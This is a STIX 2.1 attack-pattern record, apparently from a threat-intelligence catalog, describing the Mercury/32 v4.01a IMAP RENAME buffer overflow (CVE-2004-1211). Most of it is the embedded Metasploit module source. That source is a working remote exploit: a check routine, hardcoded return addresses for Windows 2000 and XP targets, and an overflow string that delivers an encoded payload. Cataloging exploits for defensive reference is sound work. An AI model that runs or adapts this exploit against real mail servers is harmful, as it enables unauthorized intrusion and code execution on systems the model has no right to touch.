{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59e8921b-5401-4f0e-9b24-bf2a3545d966",
    "created": "2024-08-14T16:47:44.084879Z",
    "modified": "2024-08-14T16:47:44.084883Z",
    "name": "Mercury/32 v4.01a IMAP RENAME Buffer Overflow",
    "description": " This module exploits a stack buffer overflow vulnerability in the Mercury/32 v.4.01a IMAP service. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/mercury_rename.rb",
            "external_id": "mercury_rename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1211"
        },
        {
            "source_name": "reference",
            "url": "http://www.nessus.org/plugins/index.php?view=single&id=15867"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Imap\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mercury/32 v4.01a IMAP RENAME Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow vulnerability in the\n        Mercury/32 v.4.01a IMAP service.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1211'],\n          [ 'OSVDB', '12508'],\n          [ 'BID', '11775'],\n          [ 'URL', 'http://www.nessus.org/plugins/index.php?view=single&id=15867'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 SP4 English',   { 'Ret' => 0x7846107b }],\n          ['Windows XP Pro SP0 English', { 'Ret' => 0x77dc0df0 }],\n          ['Windows XP Pro SP1 English', { 'Ret' => 0x77e53877 }],\n        ],\n      'DisclosureDate' => '2004-11-29'))\n  end\n\n  def check\n    connect\n    resp = sock.get_once\n    disconnect\n\n    if (resp =~ /Mercury\\/32 v4\\.01a/)\n      return Exploit::CheckCode::Appears\n    end\n      return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect_login\n\n    sploit =  \"a001 RENAME \" + rand_text_alpha_upper(260)\n    sploit << [target.ret].pack('V') + payload.encoded\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-11-29",
    "x_mitre_platforms": [
        "win'"
    ]
}